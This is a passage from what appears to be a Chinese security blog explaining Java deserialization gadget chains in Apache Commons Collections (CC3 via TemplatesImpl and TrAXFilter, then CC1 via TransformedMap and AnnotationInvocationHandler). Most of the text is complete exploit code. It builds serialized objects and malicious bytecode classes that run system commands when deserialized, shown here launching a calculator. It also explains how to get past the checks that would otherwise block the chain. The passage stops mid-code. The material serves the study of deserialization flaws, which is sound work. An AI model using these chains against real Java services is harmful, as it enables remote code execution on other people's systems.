_tfactory);\n```\n\n我们来梳理一下到目前的调用链，很短也很方便：\n\n![image-20230206143637167](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143637167.png)\n\n我们先将payload写出来：\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        templatesimpl.newTransformer();\n```\n\n写完啦 下班！（开个玩笑）逻辑上来说这两行代码确实是完整的调用链，我们接下来要做的就是对类内部的各种属性进行赋值：\n\n`newTransformer`内不需要进行赋值操作，跟进到`getTransletInstance`中 ，类内没有对_name和_class进行赋值，如果想要触发`defineTransletClasses()`我们就需要让_name不为空，_class为空，直接不给_class赋值即可：\n\n```java\nif (_name == null) return null;\n\nif (_class == null) defineTransletClasses();\n```\n\n继续跟进到`defineTransletClasses`中 ，如果想要走到下面动态加载_class，我们这里要注意对_tfactory进行赋值，否则对一个空属性调用方法，会爆空指针异常：\n\n```java\nreturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());\n```\n\n上一步之后我们在对_class赋值这里可以看到是通过修改`_bytecodes`从而控制_class的值：\n\n```java\nfor (int i = 0; i < classCount; i++) {\n                _class[i] = loader.defineClass(_bytecodes[i]);\n```\n\n一共三个需要修改的值，TemplatesImpl类是可序列化的，所以我们可以直接通过反射修改这些值，看一下这几个值的类型:\n\n```java\nprivate String _name = null;\nprivate byte[][] _bytecodes = null;\nprivate transient TransformerFactoryImpl _tfactory = null;\n```\n\n都是private属性，所以要用`setAccessible` 来修改访问权限，name是String类型，所以直接赋个字符串就行：\n\n```java\n\t\t\t\tClass tmp = templatesimpl.getClass();\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n```\n\n再看`_bytecodes`，一个二维数组，但我们在给_class赋值时defineClass接受的却是一个一维数组：\n\n```java\nfor (int i = 0; i < classCount; i++) {\n                _class[i] = loader.defineClass(_bytecodes[i]);\n\nClass defineClass(final byte[] b) {\n            return defineClass(null, b, 0, b.length);\n```\n\n所以我们给`_bytecodes` 赋值时可以将defineClass接收的一维数组放进_bytecodes这个二维数组中，这样在进行for循环遍历时就可以将这个一维数组遍历出来并传给defineClass，这个class需要我们在写好java源码后手动编译为class文件，最好把这个class文件复制到电脑上的别的地方再在这里使用（编译后的class文件一般在target下）：\n\n```java\nField bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n```\n\n```java\nTest.class\n\npublic class Calc {\n    static{\n        try {\n            Runtime.getRuntime().exec(\"open -na Calculator\"); //这里是mac弹计算器的命令\n        } catch (IOException e) {                             //win下还是calc\n            throw new RuntimeException(e);\n        }\n\n    }\n}\n```\n\n然后我们再来改_tfactory的值：\n\n这里要注意一下，被transient关键字修饰的属性是不参与序列化的，也就是说就算我们通过反射修改了它的值，反序列化后的二进制流这个属性的值也依旧是null，所以这里我们要用其他的方式赋值\n\n```java\nprivate transient TransformerFactoryImpl _tfactory = null;\n```\n\n我们在readObject中发现有对这些属性进行赋值的操作，_tfactory的值是一个TransformerFactoryImpl实例：\n\n```java\n_name = (String)gf.get(\"_name\", null);\n   //以下几行代码对序列化流中的属性读取它们的值，如果读不到值那么将它的值设为默认值（第二个参数）    \n\t\t\t  _bytecodes = (byte[][])gf.get(\"_bytecodes\", null);\n        _class = (Class[])gf.get(\"_class\", null);\n        _transletIndex = gf.get(\"_transletIndex\", -1);\n\n        _outputProperties = (Properties)gf.get(\"_outputProperties\", null);\n        _indentNumber = gf.get(\"_indentNumber\", 0);\n\n        if (is.readBoolean()) {\n            _uriResolver = (URIResolver) is.readObject();\n        }\n\n        _tfactory = new TransformerFactoryImpl();\n    }\n```\n\n我们先不进行序列化和反序列化，我们先用反射修改_tfactory的值，看看能不能弹计算器（这里我们并没有进行序列化和反序列化，所以其实就是用反射修改了个值，所以是可以修改成功的）：\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        templatesimpl.newTransformer();\n```\n\n \n\n没有弹出来计算器，爆了空指针异常，通过调试发现在_class成功加载类后，是这里抛出了异常：\n\n```java\nfinal Class superClass = _class[i].getSuperclass();\nif (superClass.getName().equals(ABSTRACT_TRANSLET)) {\n                    _transletIndex = i;\n                }\n                else {\n                    _auxClasses.put(_class[i].getName(), _class[i]);\n                }\n            }\n\n            if (_transletIndex < 0) {\n                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);\n                throw new TransformerConfigurationException(err.toString());\n            }\n```\n\n第一个if检查_class的父类是否叫`ABSTRACT_TRANSLET` ，如果没有进入到if里面那么else中的_auxClasses为空，就会抛空指针，并且下面第二个if中也会抛异常，为了避免这两个抛异常的点，我们需要将_class加载的恶意类继承名为`ABSTRACT_TRANSLET` 的父类：\n\n```java\nprivate static String ABSTRACT_TRANSLET\n        = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\";\n```\n\n修改恶意类，继承的父类中有两个抽象方法需要进行重写：\n\n```java\npublic class Calc extends AbstractTranslet{\n    static{\n        try {\n            Runtime.getRuntime().exec(\"open -na Calculator\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n        \n    }\n}\n```\n\n现在就可以弹出计算器了，如果你这里没有弹出来，看一下import的包是不是有问题，`TemplatesImpl`和`TransformerFactoryImpl`的路径一定要是com.xxx，如果是org.xxx是不能用的：\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class CC3Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        templatesimpl.newTransformer();\n\n    }\n}\n```\n\n下面我们要想办法执行`templatesimpl.newTransformer`，这里依旧是用CC1中用到的`InvokerTransformer.transform`进行代码的执行：\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(templatesimpl),\n            new InvokerTransformer(\"newTransformer\",null,null)\n        });\n        ctf.transform(1);\n```\n\n剩下的找`Chainedtransformer.transform` 的调用点就和CC1后面一样了，直接粘过来就是：\n\n```java\npackage ysoserial.payloads.Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport static ysoserial.payloads.util.Test.util.Serialize.serialize;\nimport static ysoserial.payloads.util.Test.util.Unserialize.unserialize;\n\npublic class CC3Test {\n    public static void main(String[] args) throws Exception{\n        TemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(templatesimpl),\n            new InvokerTransformer(\"newTransformer\",null,null)\n        });\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,ctf);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n    }\n}\n```\n\n相较于CC1来说一个是通过调用Runtime来进行命令执行，一个是通过动态类加载进行代码执行，如果过滤了Runtime我们就可以尝试用这条CC3\n\n接下来我们在来说ysoserial上用的另一条调用链：\n\n我们回到`newTransformer`，刚才说的是用CC1后半段直接调用，我们接着向下找调用`newTransformer` 的地方，最终锁定在了`com/sun/org/apache/xalan/internal/xsltc/trax/TrAXFilter.java` 这个类上，这个类没有继承serialize接口，也就是说我们没办法通过反射来修改实例中属性的值，但是我们想到对属性值进行初始化的操作一般在构造函数中，我们来看一下它的构造函数：\n\n```java\npublic TrAXFilter(Templates templates)  throws\n        TransformerConfigurationException\n    {\n        _templates = templates;\n        _transformer = (TransformerImpl) templates.newTransformer();\n        _transformerHandler = new TransformerHandlerImpl(_transformer);\n        _useServicesMechanism = _transformer.useServicesMechnism();\n    }\n```\n\n我们可以通过这个构造函数来控制这个templates的值，所以下一步就是要找可以调用这个构造函数的地方，ysoserial中给出了`InstantiateTransformer` 这个类，通过它的构造函数和transform方法可以调用一个对象的指定参数的构造函数：\n\n```java\n public InstantiateTransformer(Class[] paramTypes, Object[] args) {\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\npublic Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n```\n\n也就是说下面两行代码就可以执行newTransformer了：\n\n```java\nInstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\ninstantiateTransformer.transform(TrAXFilter.class);\n```\n\n最终还是用ChainedTransformer包裹起来执行：\n\n```java\nTemplatesImpl templatesimpl = new TemplatesImpl();\n        Class tmp = templatesimpl.getClass();\n\n        Field nameField = tmp.getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templatesimpl,\"y1\");\n\n        Field bytecodesField = tmp.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));\n        byte[][] codes = {code};\n        bytecodesField.set(templatesimpl,codes);\n\n        Field tfactoryfield = tmp.getDeclaredField(\"_tfactory\");\n        tfactoryfield.setAccessible(true);\n        tfactoryfield.set(templatesimpl,new TransformerFactoryImpl());\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});\n        ChainedTransformer ctf = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(TrAXFilter.class),\n            instantiateTransformer\n        });\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,ctf);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n```\n\n完整的CC6调用链，当InvokerTransformer被ban时就可以用这条链：\n\n![image-20230206143659042](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143659042.png)\n","tags":["Java反序列化"],"categories":["WebSec"]},{"title":"CommonsCollections1+6","url":"/2023/05/18/CommonsCollections1-6/","content":"# CommonsCollections1\n\n# 第一条链子：\n\n## 参考视频：\n\n[Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0)\n\n## Java环境\n\njdk8u65 下载链接：[Java Archive Downloads - Java SE 8 (oracle.com)](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)\n\n## **什么是CommonsCollections**\n\nCommons：Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的解决各种实际问题的Java开源代码。\n\nCommons Collections：Java中有一个Collections包，内部封装了许多方法用来对集合进行处理，CommonsCollections则是对Collections进行了补充，完善了更多对集合处理的方法，大大提高了性能。\n\n## **CommonsCollections1**\n\n首先我们来看一个接口，该接口内有一个方法：\n\n```java\npublic interface Transformer {\n\n    /**\n     * Transforms the input object (leaving it unchanged) into some output object.\n     *\n     * @param input  the object to be transformed, should be left unchanged\n     * @return a transformed object\n     * @throws ClassCastException (runtime) if the input is the wrong class\n     * @throws IllegalArgumentException (runtime) if the input is invalid\n     * @throws FunctorException (runtime) if the transform cannot be completed\n     */\n    public Object transform(Object input);\n\n}\n\n```\n\n我们在该接口的众多实现类中锁定可以利用的类`InvokerTransformer`，发现`InvokerTransformer`的`transform`方法利用反射可以实现任意方法调用，执行过程是先从transform方法接收一个类，通过反射获得这个类的class对象，再通过构造函数接受方法名字，参数类型，参数列表，实现了任意方法调用：\n\n```java\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        super();\n        iMethodName = methodName;\n        iParamTypes = paramTypes;\n        iArgs = args;\n    }\n\npublic Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass();\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n\n```\n\n所以我们可以通过这行代码来弹计算器，其实也就是利用了`Invokertransformer`中自带的反射省略了反射的步骤：\n\n```java\n Runtime currentRuntime = Runtime.getRuntime();\n new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\n我们接着找可利用的类，理想情况下如果有一个类的`readObject`方法中调用了`Invokertransformer.transform`，那么这个类就是我们反序列化的起点，但是我们并没有找到一个这样的类，所以接着向下找调用了`Invokertransformer.transform`的其他类。\n\n下一个可利用的类就是`Commons Collections`中的`TransformedMap`\n\n类：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png)\n\n我们主要看`TransformedMap`的构造函数和`decorate`方法：\n\n```java\n    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        super(map);\n        this.keyTransformer = keyTransformer;\n        this.valueTransformer = valueTransformer;\n    }\n\n   public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    }\n\n```\n\n`TransformedMap`的构造方法为protected，因此提供了一个静态方法`decorate`来使用它的构造方法，`decorate`接受一个map，两个Transfoemer，并对这两个Transformer做了一个“装饰”操作。\n\n`TransformedMap`中找到`checkSetValue`调用了`Invokertransformer.transform`：\n\n```java\nprotected Object checkSetValue(Object value) {\n        return valueTransformer.transform(value);\n    }\n\n```\n\n我们将上面弹计算器的payload比对一下：\n\n```java\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\n也就是说如果`checkSetValue`中，我们将`valueTransformer`替换成`InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})`，再将`transform`的参数替换成Runtime对象，就可以替代上面的写法。想要替代`valueTransformer`可以通过调用`TransformedMap.decorate`将`InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})`赋值给`valueTransformer`，修改payload如下：\n\n```java\nInvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        TransformedMap.decorate(map,null,invokerTransformer);\n\n```\n\n我们再来看怎么让value可控，首先要找调用`checkSetValue`的方法：\n\n我们锁定抽象类`AbstractInputCheckedMapDecorator.MapEntry`，查看它的`setValue`方法，并且`TransformedMap`是该抽象类的实现类：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png)\n\n```java\n static class MapEntry extends AbstractMapEntryDecorator {\n\n        /** The parent map */\n        private final AbstractInputCheckedMapDecorator parent;\n\n        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {\n            super(entry);\n            this.parent = parent;\n        }\n\n        public Object setValue(Object value) {\n            value = parent.checkSetValue(value);\n            return entry.setValue(value);\n        }\n    }\n\n```\n\n我们发现可以通过调用`setValue(currentRuntime)`方法来触发其中的`checkSetvalue`，我们现在需要一个entry来调用它的setValue方法，所以这里遍历一个Map，获取它的entry：\n\n```java\n map.put(\"k\",\"v\");\n for (Map.Entry entry:transformedMap.entrySet())\n        {\n                entry.setValue(currentRuntime);\n        }\n\n```\n\npayload此时修改为：\n\n```java\n\t    Runtime currentRuntime = Runtime.getRuntime();\n        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\t\t\t//随便给map存一对k-v 否则遍历时map为空 拿不到entry\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);\n        for (Map.Entry entry:transformedMap.entrySet()) //entrySet可以将map中的键值对以set储存起来\n        {\n                entry.setValue(currentRuntime);\n        }\n\n```\n\n我们接着找setValue在其他位置的调用\n\n---\n\n这里我们需要对环境做一点小配置，由于下一个可利用类`AnnotationInvocationHandler`是直接反编译出来的，在查找用法时找不到这个类，所以我们要将`AnnotationInvocationHandler`的java文件添加到jdk中\n\n- 我们先在openjdk找到有漏洞的java版本：[jdk8u/jdk8u/jdk: af660750b2f4 (java.net)](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)\n- 在下载好的jdk中找到sun包 路径为`jdk-af660750b2f4\\\\jdk-af660750b2f4\\\\src\\\\share\\\\classes`\n- 我们找到ysoserial使用的jdk8u65的目录，这里一般分两个情况\n    - 目录下有src.zip，利用解压工具解压后将上一步找到的sun包copy一份到src里\n    - 目录下没有src.zip，我们先在`jdk1.8 u65\\\\`下新建一个src文件夹，再在`jdk1.8 u65\\\\jre\\\\lib`下找到`rt.jar`，注意这里不要用java -jar进行解压，直接用7zip等解压工具解压即可，解压后将里面的所有东西放在`jdk1.8 u65\\\\src`下，再将上一步的sun包copy到src中\n- 最后再在idea中左上角 文件 - 项目结构，在SDK的源路径（source path）中添加src文件夹即可\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940524.png)\n\n---\n\n查找setValue的调用，发现在`AnnotationInvocationHandler`的readObject中调用了setValue，跟进查看：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940172.png)\n\nreadObject中有一个遍历map的功能，那么我们现在就可以利用这个功能代替我们上面手动遍历map拿entry的操作了：\n\n```java\n    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {\n        Class<?>[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n        this.type = type;\n        this.memberValues = memberValues;\n    }\n\nprivate void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type);\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n\n        //membersValue是构造函数接收到的一个Map\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name);\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n\n```\n\npayload修改为：\n\n```java\n Runtime currentRuntime = Runtime.getRuntime();\n        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");//AnnotationInvocationHandler类为default 不能直接访问 要通过反射获取\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);//获取构造函数\n        annotationInvocationHandlerconstructor.setAccessible(true); //实例化\n        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);//构造函数第一个参数为注解类型的calss，第二个参数为Map类型的class，也就是readObject中遍历Map时的memberValues\n\t    serialize(o);\n        unserialize(\"ser.bin\");\n\n```\n\n---\n\n但是这里有几个问题：\n\n1. \n\n```java\nmemberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n\n```\n\n这里对setValue传进去的参数应该是currentRuntime，但我们发现这个方法内的参数值我们不确定能不能控制\n\n2.\n\ncurrentRuntime是我们自己通过getRuntime方法得到的，但Runtime对象并没有继承Serializable，所以在反序列化时直接传入currentRuntime会导致反序列化失败\n\n```java\n if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy))\n                      memberValue.setValue\n\n```\n\n在执行setValue前需要绕过两个if判断\n\n---\n\n我们先来解决第二个问题，Runtime不能序列化，那么我们可以用Runtime.class来代替它，因为Class类中继承了Serializable，我们先写一个反射弹计算器的paylaod然后修改一下\n\n```java\nClass runtime = Runtime.class;\nMethod execMethod = runtime.getMethod(\"exec\", String.class);\nMethod getRuntime = runtime.getMethod(\"getRuntime\");\nexecMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n\n```\n\n通过InvokerTransformer获取getRuntime方法：\n\n```java\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);\n\n```\n\n我们利用InvokerTransformer执行任意代码的特点执行了getMethod方法，并且参数为getRuntime，最终拿到了getRuntime方法\n\n接下来我们再利用InvokerTransformer通过执行invoke方法来调用getRuntime方法：\n\n```java\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);\n\n```\n\n再通过反射弹计算器就可以了，payload修改如下，可以发现这个调用链类似于一个首尾相连的结构，上一个transformer传入下一个进行调用：\n\n```java\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\njava中刚好有一个Transformer可以让他们串起来，形成这样一个链式调用结构，这样就可以更优雅的执行payload，就是`ChainedTransformer`，我们将上面的三个transformer以数组格式传入：\n\n```java\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n        chainedTransformer.transform(Runtime.class);\n\n```\n\n这样这个问题就解决了，我们把这一串payload结合原先的payload进行替换：\n\n```java\n ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n\n\t   HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\n\nMap<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n```\n\n我们发现并不能成功弹出计算器，这个时候就要解决我们的另外两个问题了，我们先来看一下这两个判断做了什么事\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type); //type为Override\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes(); //获取Override中的成员变量\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name); //必须使返回值不为null 也就是memberTypes中要有name\n            \t\t\t\t\t\t\t\t\t\t // 所以我们可以让name为Annotion内部的变量值\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + 